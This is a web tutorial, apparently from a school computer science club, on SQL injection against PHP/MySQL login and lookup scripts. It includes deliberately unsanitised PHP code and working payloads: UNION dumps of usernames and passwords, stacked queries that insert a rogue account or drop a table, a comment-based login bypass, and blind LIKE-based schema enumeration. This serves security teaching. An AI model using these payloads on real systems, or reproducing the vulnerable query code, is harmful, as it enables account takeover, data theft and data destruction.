# SQL Injections 2

### More Advanced SQL

Where does MySQL store information about databases and tables? Can we retrieve the information? MySQL and other SQL servers store metadata about objects in a database called INFORMATION_SCHEMA. Before proceeding however, we need to understand an SQL syntax. SQL works in a hierarchy structure (database, table, column). To simply some processes, a period is used in place of qualifiers. This allows us to select a column without the need of a complex query.

```SQL
#Select the column 'test' from the table 'sql2' in the database 'tutorial_2'
SELECT test FROM tutorial_2.sql2
```

Let's get back to the magical metadata storing database called INFORMATION_SCHEMA. The database contains many tables that contain crucial information about the structure and format of tables in other databases. There are two tables that we are particularly going to focus on. The table INFORMATION_SCHEMA.COLUMNS contains data regarding the column names and column position of databases. The table INFORMATION_SCHEMA.TABLES contains data regarding table names. For more information (that you definitely will need), view the MySQL Documentation on the structure of INFORMATION_SCHEMA.
New Lesson, New Table

The last lesson's table is not realistic enough for the purpose of this lesson. I mean, who would actually make a table like that (aside from me)? Let's create a new database called tutorial_2 and a table named userinfo. The data below shows the structure of the table.

ID    Username      Password         Email
--    ----------    -------------    ---------------------- 
1     kbarr96       iamzbarr         kbarr@gmail.com
2     bobbyluig     123456           bobbyluig@hotmail.com
3     mark17        F341CK29fjqq     markdark17@aol.com
4     andies98      andies98         adny89@yahoo.com
5     nobias123     120997           ihavenobias@ymail.com

What is wrong with this table?

    'bobbyluig' used an easy password
    'nobias123' used his birthday, another easy password
    'andies98' used his username, the worst idea ever
    The passwords are stored in raw format (never do this)

Some Basic PHP for Basic Things

Here is another basic PHP script that takes a posted username value as the input and outputs the email address associated with the username.

<?php

//Create a new database
$database = new mysqli( 'localhost', 'DB_USER', 'DB_PASS', 'tutorial_2' );

//For debugging purposes in case the connection failed
if( !$database )
{
	die( 'MySQL: Wrong credentials' );
}

//Set the character set
$database->set_charset("utf8");

//Get the posted user input
$user = $_POST['user'];

//Execute a query
$result = $database->query
(
	"SELECT Email FROM userinfo WHERE Username='$user'"
);

//Checks whether the query was successful and whether there is actually data (at least 1 row of matching data)
if( !$result || mysqli_num_rows( $result ) == 0 )
{
	die( 'Error' );
}

//Prints out the email
while( $row = mysqli_fetch_assoc( $result ) )
{
	echo( "Email: " . $row['Email'] );
}

?>

We already know how to make this code output all of the email addresses at once without knowing any of the usernames. But that's no fun. I want the passwords. How might one do that you ask? The query clearly selects 'Email' and prints out the email. However, we can use the UNION operator in MySQL to "combine the result from multiple SELECT statements into a single result set" (MySQL par. 1). I have no idea why I cited that. Anyway, we can now play around and steal some information with our new assistant the UNION operator.

1) Get all of the usernames
' UNION SELECT Username FROM userinfo WHERE ''='

2) Get all of the passwords
' UNION SELECT Password FROM userinfo WHERE ''='

How the query looks now:

# 1)
SELECT Email FROM userinfo WHERE Username='' UNION SELECT Username FROM userinfo WHERE ''=''

# 2)
SELECT Email FROM userinfo WHERE Username='' UNION SELECT Password FROM userinfo WHERE ''=''

The first part of the query returns nothing. However, the second part of the query returns all of the usernames or passwords. And there we have it. It's as easy as stealing candy from a baby. Or an SQL server.
Being Malicious

So far, we've only discussed how to recon for information. What if we wanted to add a user to the database or delete something? In MySQL, a semicolon indicates the end of a statement. Therefore, we can terminate one statement and start another to perform a different function all within the same query. You might notice the annoying ' at the end which forced us in the previous example to use WHERE ''=' to consumed the final single quote. However, you may have also noticed that # or -- is used to define the start of a comment. We can use this knowledge to our adavantage.

1) Adding something to the table
'; INSERT INTO userinfo ('Username', 'Password', 'Email') VALUES ('thehacker', '2kvLXCR', 'ugot@hacked.com'); #

2) Deleting everything
'; DROP TABLE userinfo; # 

The resultant queries:

# 1)
SELECT Email FROM userinfo WHERE Username=''; INSERT INTO userinfo ('Username', 'Password', 'Email') VALUES ('thehacker', '2kvLXCR', 'ugot@hacked.com'); #'

# 2)
SELECT Email FROM userinfo WHERE Username=''; DROP TABLE userinfo; #' 

You can see how dangerous and malicious this is. Please DO NOT try this on actual websites. However, you do have full permission to engage CAMS CSC servers in any way you like.
Logging In

Many websites employ some form of a login system. Most of those login systems utilize SQL. Let's look at an example of a simple login system. I have highlighted the flaws.

<?php

//Create a new database
$database = new mysqli( 'localhost', 'DB_USER', 'DB_PASS', 'tutorial_2' );

//For debugging purposes in case the connection failed
if( !$database )
{
	die( 'MySQL: Wrong credentials' );
}

//Set the character set
$database->set_charset("utf8");

//Get the posted username and password
$user = $_POST['username'];
$pass = $_POST['password'];

//Execute a query
$result = $database->query
(
	"SELECT * FROM userinfo WHERE Username='$user' AND Password='$pass'"
);

//Checks whether the query was successful and whether there is actually data (at least 1 row of matching data)
if( !$result || mysqli_num_rows( $result ) == 0 )
{
	die( 'Error' );
}
else
{
	//Code to perform action when user successfully logs in.
}

?>

The username and password values from lines 14 and 15 are not escaped. In addition, the code only checks for whether there is one or more rows of data (line 24). This leaves a wide opening for SQL Injections. A second and more secure version is shown below.

<?php

//Omitted Code

//Checks whether the query was successful and whether there is only 1 row
if( !$result || mysqli_num_rows( $result ) != 1 )
{
	die( 'Error' );
}
else
{
	//Code to perform action when user successfully logs in.
}

?>

However, even the more secure version cannot save you. If someone knows a username, he/she could easily get into the account by injecting the username field with the following:

bobby' #

The resulting query would skip the password check.

SELECT * FROM userinfo WHERE Username='bobby' #' AND Password='$pass'

Advanced Injections

We will analyze the flawed PHP login code where more than one row will still result in a successful login. The same concepts can also be applied to the more secure version as long as the variables are not sanitized. We will now take a realistic standpoint by assuming that we do not know any users on the database nor do we have access to any of the code. The first step is to check whether the system is flawed. This can be done by using some of the SQL Injection methods. Once that is completed, begin reconstructing the query and the PHP code involved. Finally, construct the necessary attacks.

The first two steps have already been explained. We will focus on the attack constructions. Let's assume that we constructed the following server-side code.

<?php

$database = new mysqli( 'localhost', 'DB_USER', 'DB_PASS', 'DB_NAME' );

$user = $_POST['username'];
$pass = $_POST['password'];

$result = $database->query
(
	"SELECT 'something' FROM 'table' WHERE 'usercolumn'='$user' AND 'passcolumn'='$pass'"
);

if( !$result || mysqli_num_rows( $result ) == 0 )
{
	die( 'Error' );
}
else
{
	//Code to perform action when user successfully logs in.
}

?>

//What we want need to find out:
//'DB_NAME': The database name.
//'table': The table name.
//'usercolumn': The first column's name.
//'passcolumn': The second column's name.
//Additional columns or tables on the server.

There is a lot of stuff that can be found. But how can they be found? The code we have constructed only shows to possibilities. The login either fails or succeeds. Believe it or not, a true or false is all we need to find out all the data we need. Brute-forcing by pure combination is one possibility. Another type of brute-forcing that saves much more time (maybe a few trillion years?) can be performed with the assistance of the LIKE operator. Let's first look at the power of LIKE.

# 1)A 'Password' value with the letter b in it
... Password LIKE '%b%'

# 2)A 'Password' value where the first letter is b
... Password LIKE 'b%'

# 3)A 'Password' value where the second letter is b
... Password LIKE '_b%'

# 4)A 'Password' value where the last letter is b
... Password LIKE '%b'

# 5)A 'Password' value where the second to last letter is b
... Password LIKE '%b_'

We can now use this magical operator to ask the server yes or no questions and find out all the information we need. We can input anything into the username that doesn't mess with the query. I'll be using 'bar' without quotes. The following password queries were sent. The results are shown them.

# Query 1
' OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE 's%' AND TABLE_SCHEMA != 'information_schema') #

# Query 2
' OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE 't%' AND TABLE_SCHEMA != 'information_schema') #

# Query 3
' OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE 'u%' AND TABLE_SCHEMA != 'information_schema') #

# Query 4
' OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE 'tt%' AND TABLE_SCHEMA != 'information_schema') #

# Query 5
' OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE 'tz%' AND TABLE_SCHEMA != 'information_schema') #

# Query 6
' OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE 'tu%' AND TABLE_SCHEMA != 'information_schema') #

Resultant queries:

# Query 1
SELECT * FROM userinfo WHERE Username='bar' AND Password='' OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE 's%' AND TABLE_SCHEMA != 'information_schema') #'

# Query 2
SELECT * FROM userinfo WHERE Username='bar' AND Password='' OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE 't%' AND TABLE_SCHEMA != 'information_schema') #'

# Query 3
SELECT * FROM userinfo WHERE Username='bar' AND Password='' OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE 'u%' AND TABLE_SCHEMA != 'information_schema') #'

# Query 4
SELECT * FROM userinfo WHERE Username='bar' AND Password='' OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE 'tt%' AND TABLE_SCHEMA != 'information_schema') #'

# Query 5
SELECT * FROM userinfo WHERE Username='bar' AND Password='' OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE 'tz%' AND TABLE_SCHEMA != 'information_schema') #'

# Query 6
SELECT * FROM userinfo WHERE Username='bar' AND Password='' OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE 'tu%' AND TABLE_SCHEMA != 'information_schema') #'

Results:

# Query 1 - Failed

# Query 2 - Succeeded

# Query 3 - Failed

# Query 4 - Failed

# Query 5 - Failed

# Query 6 - Succeeded

Based on those queries, we know that the first two letters of the database name is 'tu'. The same concept can be applied to everything else as well.
Further Readings and References

"SQL Injection Attacks by Example" - http://www.unixwiz.net/techtips/sql-injection.html

Home

Menu

Creative Commons License
Except where otherwise noted, content on this site is licensed under a Creative Commons Attribution 4.0 International License.
